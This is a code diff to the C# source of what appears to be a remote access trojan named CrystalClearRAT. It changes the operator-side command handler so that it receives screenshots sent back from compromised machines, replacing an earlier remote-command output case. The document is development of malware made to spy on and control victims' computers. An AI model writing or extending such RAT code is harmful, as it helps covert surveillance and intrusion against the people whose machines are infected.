@@ -2,6 +2,8 @@
 using CrystalRATShared.Commands;
 using System;
 using System.Collections.Generic;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
 using System.Text;
@@ -14,6 +16,7 @@ namespace CrystalClearRAT.Functions
     {
 
         public static event EventHandler GenericCommandReceived;
+        public static event EventHandler ImageReceived;
 
 
         public static void Process(CommandFlags flag, BinaryReader reader)
@@ -21,10 +24,11 @@ namespace CrystalClearRAT.Functions
             switch (flag)
             {
                 case CommandFlags.GenericCommandOutput:
-                    GenericCommandReceived(null, new GenericCommandArgs(reader.ReadString()));
+                    GenericCommandReceived?.Invoke(null, new GenericCommandArgs(reader.ReadString()));
                     break;
-                case CommandFlags.RemoteCMD:
-                    Console.WriteLine(reader.ReadString());
+                case CommandFlags.Screenshot:
+                    byte[] img = reader.ReadBytes((int)(reader.BaseStream.Length - reader.BaseStream.Position));
+                    ImageReceived?.Invoke(null, new ImageArgs(img));
                     break;
                 default:
                     throw new ArgumentException("No command corresponding to the given value.");
